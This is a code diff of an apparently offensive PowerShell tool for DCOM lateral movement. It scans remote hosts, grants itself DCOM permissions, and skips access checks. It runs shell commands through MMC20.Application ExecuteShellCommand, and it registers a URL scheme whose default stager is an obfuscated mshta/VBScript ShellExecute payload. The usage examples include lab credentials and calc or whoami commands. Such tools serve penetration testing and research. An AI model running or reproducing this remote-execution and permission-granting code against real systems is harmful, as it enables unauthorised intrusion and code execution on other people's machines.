         Finally, revert the machine to the same state as before the attack.
         
-        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt"  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -Hostlist "10.211.55.4" -MaxResults 1 -Verbose
+        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt" -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -Hostlist "10.211.55.4" -MaxResults 1 -Verbose
 
         .EXAMPLE
 
-        Scans all the objects stored on the 10.211.55.1/24 range and finds the functions located on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt").
-        Force mode: This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
+        Scans all the objects stored on the available remote machines from the 10.211.55.1/24 range and finds potential vulnerable functions from the list located on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt").
 
-        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -Hostlist "10.211.55.1/24" -Force -Verbose
+        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -Hostlist "10.211.55.1/24" -Verbose
     #>
     [CmdletBinding(SupportsShouldProcess=$true)]
     param
@@ -3439,98 +3478,101 @@ function Invoke-DCOMObjectScan {
         [System.Int32]$MaxResults=0,
         [switch]$AutoGrant,
         [switch]$CheckAccessOnly,
-        [switch]$NoAuth,
-        [switch]$Force
+        [switch]$SkipRegAuth,
+        [switch]$SkipPermissionChecks
     )
     try {
-
-        if(!$Username) {
-            $Username = "$($env:USERDOMAIN)\$($env:USERNAME)"
-        }
-
-        if($NoAuth) {
-            $AutoGrant = $false
-        }
-
         Start-DefaultTasks -Type Init|Out-Null
-        foreach($RemoteIP in (Enum-HostList -HostList $Hostlist)) {
-            try {
-                Start-DefaultTasks -Type StartTask|Out-Null
 
-                if(!$CheckAccessOnly) {
-                    if(!$FunctionListFile) {
-                        Write-Log -level Error -Message "please specify the FunctionListFile parameter!"
-                        return
-                    }
-                    if(!$(Parse-FunctionListFile -FileLocation $FunctionListFile)) {
-                        return
-                    }
-                }
-
-                if(!(Start-DefaultTasks -Type TaskChecks -RemoteIP $RemoteIP -Username $Username -Password $Password -AutoGrant:$AutoGrant -NoAuth:$NoAuth)) {
+        switch($Type) {
+            "All" {
+                if($SkipRegAuth) {
+                    Write-Log -Level ERROR -Message "Can't fetch DCOM list without authentication!"
                     return
                 }
-                if($NoAuth) {
-                    $DefaultChecks = $true
-                } else {
-                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant -forceVerbose
+                break
+            }
+            "List" {
+                if(!$ObjectListFile) {
+                    Write-Log -Level ERROR "$($ObjectListFile) not assigned!"
+                    return
+                }
+                break
+            }
+            "Single" {
+                if(!$ObjectName) {
+                    Write-Log -Level ERROR "ObjectName is not specified!"
+                    return
+                }
+                break
+            }
+        }
+
+        if(!$CheckAccessOnly) {
+            if(!$FunctionListFile) {
+                Write-Log -level Error -Message "please specify the FunctionListFile parameter!"
+                return
+            }
+            if(!$(Parse-FunctionListFile -FileLocation $FunctionListFile)) {
+                return
+            }
+        }
+        $Username = Check-Username -Username $Username
+        Write-Log -Level INFO -Message "[+] Scanning started."
+        foreach($RemoteIP in (Enum-HostList -HostList $Hostlist)) {
+            try {
+                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
+                    continue
+                }
+
+                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
+                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
+                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
+                        continue
+                    }
+
+                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
+                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
+                            continue
+                        }
+                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
+                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
+                    }
                 }
         
-                Write-Log -Level INFO -Message "[+] Scanning started."
+                
 
                 & {
                     switch($Type) {
                         "All" {
-                            if($NoAuth) {
-                                Write-Log -Level ERROR -Message "Can't fetch DCOM list without authentication!"
-                                return
-                            }
                             Get-DCOMObjectList -RemoteIP $RemoteIP
                             break
                         }
                         "List" {
-                            if(!$ObjectListFile) {
-                                Write-Log -Level ERROR "$($ObjectListFile) not assigned!"
-                                return
-                            }
-                            (Read-File -FileName $ObjectListFile -AsArray) #| Select -Unique| Sort-Object {Get-Random}
+                            (Read-File -FileName $ObjectListFile -AsArray) | Select -Unique| Sort-Object {Get-Random}
                             break
                         }
                         "Single" {
-                            if(!$ObjectName) {
-                                Write-Log -Level ERROR "ObjectName is not specified!"
-                                return
-                            }
                             %{ $ObjectName }
                             break
                         }
                     }
                 }| ForEach {
-                    try {
-                
-                        Invoke-DCOMAnalyzer -ObjectName $_ -MaxDepth $MaxDepth -MaxResults $MaxResults -RemoteIP $RemoteIP -Username $Username -Password $Password -AutoGrant:$AutoGrant -CheckAccessOnly:$CheckAccessOnly -DefaultChecks:$DefaultChecks -NoAuth:$NoAuth -Force:$Force|Out-Null
-                        if(Quit-COMObject) {
-                            Write-Log -Level VERBOSE -Message "$($_) quitted successfully"
+                    $ObjectName = Wrap-CLSID -ObjectName $_
+                    if(!$SkipRegAuth -and !$SkipPermissionChecks) {
+                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
+                        if(!$CLSIDChecks) {
+                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
+                            continue
                         }
-                        [System.GC]::Collect() # perform garbage collection in order to release memory
-                        Write-Log -Level INFO -Message  "$($_) Scanned!"
-                    } catch {
-                        Write-Log -Level ERROR -Message $_
                     }
-                }
-
-        
-                Write-Log -Level INFO -Message "[+] Log file location: ($global:LogFileName)"
-                if($global:ResultsStream) {
-                    Write-Log -Level INFO -Message "[+] Results file location: ($global:ResultsFileName)"
+                    Invoke-DCOMAnalyzer -ObjectName $ObjectName -MaxDepth $MaxDepth -MaxResults $MaxResults -RemoteIP $RemoteIP -CheckAccessOnly:$CheckAccessOnly -SkipRegAuth:$SkipRegAuth|Out-Null
+                    Write-Log -Level INFO -Message  "$($ObjectName) Scanned!"
                 }
             } catch {
                 Write-Log -Level ERROR -Message $_
             } finally {
-                if($AutoGrant) {
-                    Rev2Self
-                }
-                Start-DefaultTasks -Type EndTask|Out-Null
+                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
             }
         }
 
@@ -3561,26 +3603,29 @@ function Get-ExecutionCommand {
         Example: 10.211.55.1/24
         Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname
 
-        .PARAMETER Username
-        Specifies the username to use for remote-registry authentication (Not available on NoAuth mode).
+       .PARAMETER Username
+        Specifies the username to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER Password
-        Specifies the password to use for remote-registry authentication (Not available on NoAuth mode).
+        Specifies the password to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER AutoGrant
         AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
-        (This is required when don't have the rights to interact with the DCOM object (Not available on NoAuth mode)).
+        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
         Windows wil allow by default the following ACTIVE SESSIONS:
             Administrators
             System
 
-        .PARAMETER Force
-        Force mode: This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
+        .PARAMETER SkipPermissionChecks
+        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
+        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.
 
-        .PARAMETER NoAuth
-        Try to blindly launch the remote object, without checking access to it using remote-registry
+        .PARAMETER SkipRegAuth
+        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
+        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
+        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
 
         .PARAMETER Verbose
         Get Verbose logging
@@ -3601,16 +3646,16 @@ function Get-ExecutionCommand {
 
         .EXAMPLE
 
-        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.1/24 ip range using current logged-on session (Even the tool assumes that the user doesn't have access to the object),
+        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.1/24 ip range using current logged-on session without analyze ACL permissions
         then it will generates the execution command.
 
-        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.1/24" -Force -Verbose
+        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.1/24" -SkipPermissionChecks -Verbose
 
         .EXAMPLE
 
-        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.4 ip address, without checking principal-identity privileges
+        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.4 ip address, without querying the registry.
 
-        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -NoAuth -Verbose
+        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -SkipRegAuth -Verbose
     #>
     [CmdletBinding(SupportsShouldProcess=$true)]
     param
@@ -3623,38 +3668,41 @@ function Get-ExecutionCommand {
         [string]$Username="",
         [string]$Password="",
         [switch]$AutoGrant,
-        [switch]$NoAuth,
-        [switch]$Force
+        [switch]$SkipRegAuth,
+        [switch]$SkipPermissionChecks
     )
     # This function is responsible to generates execution command of specific DCOM object and path
 
     try {
-        if(!$Username) {
-            $Username = "$($env:USERDOMAIN)\$($env:USERNAME)"
-        }
-        if($NoAuth) {
-            $AutoGrant = $false
-            $DefaultChecks = $true
-            $CLSIDChecks = $true
-        }
-
         Start-DefaultTasks -Type Init|Out-Null
+        $Username = Check-Username -Username $Username
         foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
              try {
-                Start-DefaultTasks -Type StartTask|Out-Null
-                if(!(Start-DefaultTasks -Type TaskChecks -RemoteIP $RemoteIP -Username $Username -Password $Password -AutoGrant:$AutoGrant -NoAuth:$NoAuth)) {
-                    return
+                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
+                    continue
                 }
-                if(!$NoAuth) {
-                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant -forceVerbose
-                    $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant -forceVerbose
-                    if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
-                        Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
+                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+
+                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
+                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
+                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                         continue
                     }
-                }
 
-                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
+                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
+                            continue
+                        }
+                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
+                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
+                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
+                        if(!$CLSIDChecks) {
+                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
+                            continue
+                        }
+                    }
+                }
+                
                 if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) {
                     continue
                 }
@@ -3687,19 +3735,14 @@ function Get-ExecutionCommand {
             } catch {
                 Write-Log -Level ERROR -Message $_
             } finally {
-                if($AutoGrant) {
-                    Rev2Self
-                }
-                if(Quit-COMObject) {
-                    Write-Log -Level VERBOSE -Message "$($ObjectName) quitted successfully"
-                }
-                Start-DefaultTasks -Type EndTask|Out-Null
+                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
             }
         }
 
     } catch {
         Write-Log -Level ERROR -Message $_
     } finally {
+        
         Start-DefaultTasks -Type Finish|Out-Null
     }
     
@@ -3724,15 +3767,28 @@ function Invoke-ExecutionCommand {
         Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname
 
         .PARAMETER Username
-        Specifies the username to use for remote-registry authentication (Not available on NoAuth mode).
+        Specifies the username to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER Password
-        Specifies the password to use for remote-registry authentication (Not available on NoAuth mode).
+        Specifies the password to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
-        .PARAMETER Force
-        Force mode: This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
+        .PARAMETER AutoGrant
+        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
+        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
+        Windows wil allow by default the following ACTIVE SESSIONS:
+            Administrators
+            System
+
+        .PARAMETER SkipPermissionChecks
+        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
+        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.
+
+        .PARAMETER SkipRegAuth
+        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
+        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
+        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
 
         .PARAMETER Commands
         Specifies the commands inside a list.
@@ -3743,21 +3799,6 @@ function Invoke-ExecutionCommand {
             }
         )
         Example: @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c whoami > c:\res.txt","Minimized")} )
-
-        .PARAMETER AutoGrant
-        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
-        (This is required when don't have the rights to interact with the DCOM object (Not available on NoAuth mode)).
-        Windows wil allow by default the following ACTIVE SESSIONS:
-            Administrators
-            System
-
-        .PARAMETER Force
-        Force mode: This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
-
-        .PARAMETER NoAuth
-        Try to blindly launch the remote object, without checking access to it using remote-registry
 
         .PARAMETER Verbose
         Get Verbose logging
@@ -3770,19 +3811,19 @@ function Invoke-ExecutionCommand {
         2. Frame.Top attribute to "1"
         Finally, revert the machine to the same state as before the attack.
         
-        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -Verbose -HostList 10.211.55.1/24
+        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -HostList "10.211.55.1/24" -Verbose
 
         .EXAMPLE
 
         Tries to interact with MMC20.Application object using lab\administrator credentials through 10.211.55.4 ip address, and executes the following command: "cmd.exe /c calc".
         
-        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Username lab\administrator -Password Aa123456!
+        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -Username "lab\administrator" -Password "Aa123456!" -Verbose
 
         .EXAMPLE
 
-        Tries to interact with MMC20.Application object using current logged-on user session (Even the tool assumes that the user doesn't have an access to the object), and executes the following command: "cmd.exe /c calc".
+        Tries to interact with MMC20.Application object using current logged-on user session without analyze ACL permissions, and executes the following command: "cmd.exe /c calc".
         
-        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -Verbose -HostList 10.211.55.4 -Force
+        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -SkipPermissionChecks -Verbose
 
 
     #>
@@ -3797,37 +3838,39 @@ function Invoke-ExecutionCommand {
         [string]$Username="",
         [string]$Password="",
         [switch]$AutoGrant,
-        [switch]$NoAuth,
-        [switch]$Force
+        [switch]$SkipRegAuth,
+        [switch]$SkipPermissionChecks
     )
     try {
-        if(!$Username) {
-            $Username = "$($env:USERDOMAIN)\$($env:USERNAME)"
-        }
-        if($NoAuth) {
-            $AutoGrant = $false
-            $DefaultChecks = $true
-            $CLSIDChecks = $true
-        }
-        Start-DefaultTasks -Type Init
+        Start-DefaultTasks -Type Init|Out-Null
+        $Username = Check-Username -Username $Username
         foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
             try {
-                Start-DefaultTasks -Type StartTask|Out-Null
-
-                if(!(Start-DefaultTasks -Type TaskChecks -RemoteIP $RemoteIP -Username $Username -Password $Password -AutoGrant:$AutoGrant -NoAuth:$NoAuth)) {
-                    return
+                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
+                    continue
                 }
-
-                if(!$NoAuth) {
-                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant -forceVerbose
-                    $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant -forceVerbose
-                    if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
-                        Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
+                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
+                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
+                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                         continue
+                    }
+
+                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
+                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
+                            continue
+                        }
+                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
+                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
+                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
+                        if(!$CLSIDChecks) {
+                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
+                            continue
+                        }
                     }
                 }
 
-                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                
                 if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) {
                     continue
                 }
@@ -3855,13 +3898,7 @@ function Invoke-ExecutionCommand {
             } catch {
                 Write-Log -Level ERROR -Message $_
             } finally {
-                if($AutoGrant) {
-                    Rev2Self
-                }
-                if(Quit-COMObject) {
-                    Write-Log -Level VERBOSE -Message "$($ObjectName) quitted successfully"
-                }
-                Start-DefaultTasks -Type EndTask|Out-Null
+                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
             }
         }
     } catch {
@@ -3887,10 +3924,24 @@ function Invoke-RegisterRemoteSchema {
         Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname
 
         .PARAMETER Username
-        Specifies the username to use for remote-registry authentication.
+        Specifies the username to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
 
         .PARAMETER Password
-        Specifies the password to use for remote-registry authentication.
+        Specifies the password to use for access.
+        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session
+
+        .PARAMETER AutoGrant
+        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
+        (This is required when don't have the rights to interact with the DCOM object).
+        Windows wil allow by default the following ACTIVE SESSIONS:
+            Administrators
+            System
+
+        .PARAMETER SkipPermissionChecks
+        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
+        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.
+
 
         .PARAMETER URLScheme
         Specifies the URL scheme in order to trigger the execution (Default: dvs)
@@ -3898,22 +3949,10 @@ function Invoke-RegisterRemoteSchema {
         .PARAMETER StageCommand
         Specifies the Stage command in order to execute the payload (must include %1 in order to use your payload)
 
-        .PARAMETER AutoGrant
-        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
-        (This is required when don't have the rights to interact with the DCOM object (Not available on NoAuth mode)).
-        Windows wil allow by default the following ACTIVE SESSIONS:
-            Administrators
-            System
-
-        .PARAMETER Force
-        Force mode: This mode will attempt to access a DCOM object even if the tool assumes that the principal-identity doesn't have access to it.  
-        This flag is created to solve the edge-case in which the tool can't resolve the groups the current logged-on/provided user is a member of.  
-        For example: When an endpoint is used which is not domain joined and the tool can't resolve group which the user is a member of, then, the tool will assume that the user is only a member of "Everyone" group.
-
         .PARAMETER Command
         Specifies the command to execute.
 
-        .PARAMETER DisableBracketsDoubleEncoding
+        .PARAMETER NoBracketsDoubleEncoding
         By triggering this flag, the tool will not perform double URL encoding on brackets
 
         .PARAMETER Verbose
@@ -3923,13 +3962,13 @@ function Invoke-RegisterRemoteSchema {
 
         Executes "cmd /c calc" command on 10.211.55.1/24 remote machine using the current logged-on session, and grant privileges if is needed
         
-        PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.1/24 -Command cmd /c "calc" -AutoGrant
+        PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.1/24" -Command "cmd /c calc" -AutoGrant -Verbose
 
         .EXAMPLE
 
-        Executes "cmd /c calc" command on 10.211.55.4 remote machine using the current logged-on session using provided credentials
+        Executes "cmd /c calc" command on 10.211.55.4 remote machine using provided credentials
         
-        PS> Invoke-RegisterRemoteSchema -HostList 10.211.55.4 -Command "cmd /c calc" -Username Administrator -Password Aa123456!
+        PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.4" -Command "cmd /c calc" -Username "Administrator" -Password "Aa123456!" -Verbose
     #>
     [CmdletBinding(SupportsShouldProcess=$true)]
     param
@@ -3942,12 +3981,11 @@ function Invoke-RegisterRemoteSchema {
         [string]$URLScheme="dvs",
         [string]$StageCommand='mshta vbscript:ExEcUtE("c=Replace(Replace(Replace(""%1"", Chr(37)&""22"", Chr(34)),Chr(37)&""27"", Chr(39)),""' + $URLScheme + '://"",""""):if Right(c,1)=""/"" then:c=mid(c,1,len(c)-1):end if:sc = split(c, "" ""):f=sc(0):a=Replace(c,f,""""):CreateObject(""Shel""&""l.App""&""lication"").Shel"&"lEx"&"ecu"&"te f,"&"a,"""","""",0 :cl"&"ose")',
         [switch]$AutoGrant,
-        [switch]$Force,
-        [switch]$DisableBracketsDoubleEncoding
+        [switch]$SkipPermissionChecks,
+        [switch]$NoBracketsDoubleEncoding
     )
     try {
         Start-DefaultTasks -Type Init|Out-Null
-
         $URLScheme = $URLScheme.ToLower()
         if((!($URLScheme -match [regex]"^([a-z0-9]){0,}$"))) {
             Write-Log -Level ERROR -Message "URLScheme invalid! the URLscheme can contains digits and letters only!"
@@ -3957,9 +3995,13 @@ function Invoke-RegisterRemoteSchema {
             Write-Log -Level ERROR -Message "StageCommand must contains ""%1"" in order to execute your payload!"
             return
         }
-        if(!$Username) {
-            $Username = "$($env:USERDOMAIN)\$($env:USERNAME)"
+        
+        $Username = Check-Username -Username $Username
+
+        if(!$NoBracketsDoubleEncoding) {
+            $Command = $Command.Replace('"', "%2522").Replace("'", "%2527")
         }
+
         $DCOMWithNavigationFunctionality = @(
             "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", # ShellBrowserWindow
             "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", # ShellWindows
@@ -4064,28 +4106,27 @@ function Invoke-RegisterRemoteSchema {
 
         foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
             try {
-                Start-DefaultTasks -Type StartTask|Out-Null
-                if(!(Start-DefaultTasks -Type TaskChecks -RemoteIP $RemoteIP -Username $Username -Password $Password -NoAuth)) {
-                    return
-                } 
+                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
+                    continue
+                }
 
                 if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM)) {
-                    Write-Log -Level ERROR -Message "HKLM is not readable!."
+                    Write-Log -Level ERROR -Message "HKLM is not readable!"
                     $DCOMList = $DCOMWithNavigationFunctionality
                     $isHKLMWritable = $false
                 } else {
-                
-                    if(!(Test-DCOMStatus -AutoGrant:$AutoGrant) -and !$Force) {
-                        return
+                    if(!$SkipPermissionChecks) {
+                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant) -and !$Force) {
+                            continue
+                        }
                     }
-                    
-                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant -forceVerbose
+                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
                     $DCOMList = New-Object System.Collections.ArrayList
                     foreach($dcom in $DCOMWithNavigationFunctionality) {
                         if(!(is-GUID $dcom)) {
                             $dcom = Get-CLSID -ProgID $dcom
                         }
-                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $dcom -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant -forceVerbose
+                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $dcom -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                         if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
                             Write-Log -Level ERROR -Message "You dont have permissions to access $($dcom) object!"
                             continue
@@ -4096,30 +4137,36 @@ function Invoke-RegisterRemoteSchema {
                         Write-Log -Level ERROR -Message "The user has not granted to launch the used DCOM objects."
                         return
                     }
-                    $isHKLMWritable = Check-RegistryPermission -RemoteIP $RemoteIP -Key "Software\Classes" -CheckWritePermissions
-                    if(!$isHKLMWritable) {
-                        Write-Log -Level ERROR -Message "HKLM is not writable!" -forceVerbose
-                    }
